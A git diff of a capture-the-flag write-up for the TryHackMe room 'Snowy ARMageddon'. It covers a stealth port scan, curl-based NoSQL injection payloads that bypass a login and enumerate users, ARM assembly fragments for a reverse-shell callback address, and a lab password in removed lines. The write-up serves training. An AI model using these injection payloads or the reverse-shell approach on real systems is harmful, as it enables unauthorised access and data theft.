@@ -1,3 +1,6 @@
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/9526e3dc-8779-413e-8289-fca77aaed65f)
+
+
 # Snowy ARMageddon #
 ### https://tryhackme.com/room/armageddon2r ###
 
@@ -18,14 +21,18 @@
 
 
 ### TL;DR : ###
--  Use assembly decomp
+-  Scan the Victim IP to determine open ports on 8080 and 50628
+-  Find and modify an exploit (including some assembly code) to establish a revers shell to an IP Camera
+-  Pivot from the IP camera to an internal-only web application by using NoSQLi
 #   
 
->Christmas 2023 is already just around the corner. The Bandit Yeti has been sleeping for most of the year to prepare to hack back into the Best Festival Company. Should he have used that time to plan his attack? Probably. But Yetis need a lot of energy, so don't judge!
+>Your main target? Access that internal-only web application. That's where the juicy stuff is hidden. Now, gettin' full privileges on the machine – that's a tasty bonus, but don't sweat it if it's out of reach. The key is to complete the mission without kickin' up a snowstorm.
 
-This room was included as one of the sidequests for the TryHackMe Advent of Cyber 2023.  We are given [a network capture file; `VanSpy.pcapng`](assets/VanSpy.pcapng) and tasked with answering the following questions:
+>Remember, this is all about bein' as silent as the falling snow and as cunning as the arctic fox. Ready? Let's dive into this digital blizzard and show 'em what the Bandit Yeti's made of!
 
-**NOTE :** Passwords, hashes and flags are redacted in this document.  If you'd like to know the answers simply go to the [TryHackMe Room](https://tryhackme.com/room/adv3nt0fdbopsjcap) and follow the steps - it's free 😄
+This room was included as one of the sidequests for the TryHackMe Advent of Cyber 2023.  We are given a target machine IP address which for the sake of this writeup will be **Victim IP: `10.10.106.239`**
+
+**NOTE :** Passwords, hashes and flags are redacted in this document.  If you'd like to know the answers simply go to the [TryHackMe Room](https://tryhackme.com/room/armageddon2r) and follow the steps - it's free 😄
 
 >What is the content of the first flag?
 >
@@ -35,7 +42,7 @@ This room was included as one of the sidequests for the TryHackMe Advent of Cybe
 
 ## Procedure ##
 
-Victim IP: `10.10.106.239`
+
 
 Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
 The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.
@@ -43,13 +50,13 @@ The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relative
 
 
 ```
-sudo nmap -sS -p1-65335 10.10.200.123
+sudo nmap -sS -p1-65335 10.10.106.239
 ```
 **_NOTE:_** You may also use `rustscan -a 10.10.106.239` which yields MUCH quicker portscan results - but honestly I don't know how it compares to NMAP with -sS in terms of 'noisieness'.
 
 ```
 Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-15 09:02 GMT
-Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.200.123)
+Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.106.239)
 Host is up (0.00029s latency).
 
 PORT      STATE SERVICE
@@ -68,7 +75,7 @@ From the scan results we can see four open ports:
 
 Connecting via SSH is not possible and we get a `Permission denied (publickey)` error.   Attempting to connect via Telnet successfully establishes a connection which is immediately terminated by the host, and since we don't know anything about port `50628` so far, we're going to ignore it for the time being.
 
-This leaves us with port `8080` and we can just open a browser and navigate to `http://10.10.200.123:8080/` to bring up a website with an angry-looking elf:
+This leaves us with port `8080` and we can just open a browser and navigate to `http://10.10.106.239:8080/` to bring up a website with an angry-looking elf:
 
 ![angry-looking elf](https://private-user-images.githubusercontent.com/60655500/296706743-c385f64f-641c-4ecc-8a62-967f08084d7d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MDUzMTAwOTAsIm5iZiI6MTcwNTMwOTc5MCwicGF0aCI6Ii82MDY1NTUwMC8yOTY3MDY3NDMtYzM4NWY2NGYtNjQxYy00ZWNjLThhNjItOTY3ZjA4MDg0ZDdkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAxMTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMTE1VDA5MDk1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJkNjhhYjkyMTJiYTIzMGFkYjBjMTgzNzU2ODY2NGRjODRiZTRjMmZmZDhiZWI5MGZmNjU3MGNkY2FmNzJlMjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.2yZw1zeU49ni4BdVoZMqBM-GnLyi8Nx9KaTgKTmU94s)
 
@@ -230,7 +237,7 @@ With this username / password combination in hand we can now head back to the br
 
 Now that we are on the inside of the work (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
 ```
-$ curl http://10.10.188.58:8080
+$ curl http://10.10.106.239:8080
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   461  100   461    0     0   5971      0 --:--:-- --:--:-- --:--:--  6681
@@ -246,13 +253,13 @@ credentials (e.g., bad password), or your
 browser doesn't understand how to supply
 the credentials required.</p>
 <hr>
-<address>Apache/2.4.57 (Debian) Server at 10.10.188.58 Port 8080</address>
+<address>Apache/2.4.57 (Debian) Server at 10.10.106.239 Port 8080</address>
 </body></html>
 ```
 
 We are served a page saying that the server is expecting us to supply credentials to access it, so perhaps we can try passing the credentials we just retrieved for the camera dashboard:
 ```
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.188.58:8080/
+curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
 <br />
 <b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
 <!DOCTYPE html>
@@ -268,7 +275,7 @@ curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.188.58:8080/
 ```
 This still throws up an error, but if we add the `-L` switch to `curl` it wll follow website redirects and this time we get a different result:
 ```
-$ curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080 -L
+$ curl -u 'admin:Y3<R E D A C T E D>d=admin' -s http://10.10.106.239:8080 -L
 
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-900">
@@ -306,12 +313,12 @@ $ curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080 -L
 ...
 ```
 
-From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.61.217:8080/login.php` we are served with the exact page, so we now know where we were being redirected too and which page is expecting us to pass it a username and password 
+From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.106.239:8080/login.php` we are served with the exact page, so we now know where we were being redirected too and which page is expecting us to pass it a username and password 
 
 Let's try and re-write our `curl` command to pass on our username and password to `login.php`.  We also add a `-c` switch to save any cookies served by the page:
 
 ```
-$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.61.217:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie -L
+$ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username=admin&password=Y3<R E D A C T E D>n' -c cookie -L
 ```
 This time we get a response telling us that the username or password are incorrect:
 ```
@@ -326,7 +333,7 @@ Well what to do next - we can send data to the server for processing but we don'
 The following `curl` command effictively matches to the first user in the database that has a non-null username and password:
 
 ```
-$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
+$ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
 ```
 
 And it works!  we're now presented with a different HTML which includes the message **Welcome Frostbite**.
@@ -355,7 +362,7 @@ It would appear that the first username in the database is `Frostbite` but his d
 To do this I modified the `curl` command I used earlier to now exclude the username `Frostbite` and match on the next available one:
 
 ```
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.1.6:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
+curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
 ```
 
 This time we see the message **Welcome `Snowballer`**, but again not much else.  
@@ -390,83 +397,27 @@ It was not possible to retrieve any further usernames, so I am assuming that thi
 The final curl command I used was:
 
 ```
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
+curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
 ```
 
-And now that we know that we're interestign in retrieving `Frosteau`'s dashboard we can clean this up to the following:
+Which gave me the following output:
 ```
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
-```
-
-          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
+<h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
 Size: 13899
 ```
 
 
-![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/4cdaa093-1b60-4fc3-a61d-63c7f4121f08)
-
-
-$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username=Frosteau&password[$regex]=.*' -c cookie.txt -L
-$ 
-<!DOCTYPE html>
-<html lang="en" class="h-full bg-thm-800">
-
-<head>
-  <meta charset="UTF-8" />
-  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TryHackMe | Cyber Police Dashboard</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
-
+And now that we know that we're interested in retrieving `Frosteau`'s dashboard we can clean up this `curl` command to the following:
 ```
+curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
+```
+
+Finally we are served `Frosteau`'s dashboard which - luckily for us - includes the contents of `yetikey2.txt` in cleartext in his 'Important Notes' section
+
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/2689690b-8ea5-4594-80c2-9e2e36f0a32e)
 
+I copied the html output and pasted it to a blank document on my local machine for a better-looking formatted output:
 
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b450a6e4-c0fe-41be-afeb-448e69629909)
 
-```
-    
-```
-
-
-
-#  
-#  
-#  
-```
-21      /* ADDR */
-22      mov r1, #0xEC       ; Move 0xEC into register r1 (0x0A * 256 + 0xEC = 10.10)
-23      lsl r1, #8          ; Left shift r1 by 8 bits
-24      add r1, #0x0A       ; Add 0x0A to r1 (0xEC0A = 10.10 in little-endian)
-25      lsl r1, #8          ; Left shift r1 by 8 bits
-26      add r1, #0x03       ; Add 0x03 to r1 (0x0AEC03 = 10.10.236.3 in little-endian)
-27      push {r1}           ; Push the value in r1 onto the stack (little-endian)
-```
-
-![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/dbffc18e-c759-424f-a818-9afc521d082f)
-
-
-```
- mov r1, #0xdc      <==== 220
- lsl r1, #8         <==== shift 8 bits left           
- add r1, #0x42      <=== 66
- lsl r1, #8
- add r1, #0x08      <=== 8 +
- add r1, #0x02      <=== 2 = 10
- lsl r1, #8
- add r1, #0x08
- add r1, #0x02
-push {r1}
-
-```
-```
-name=admin
-password=Y3tiStarCur!ouspassword=admin
-```
-
-
-
-<!--stackedit_data:
-eyJoaXN0b3J5IjpbLTExMzkyMzM1MiwtNDIyMzQ1OTI2LC0xMj
-A2MDY3NDE0XX0=
--->
+And right there at the bottom there is a list of usernames which took me oh so long to retrieve!  I wonder if there was a way of getting to that list earlier on!
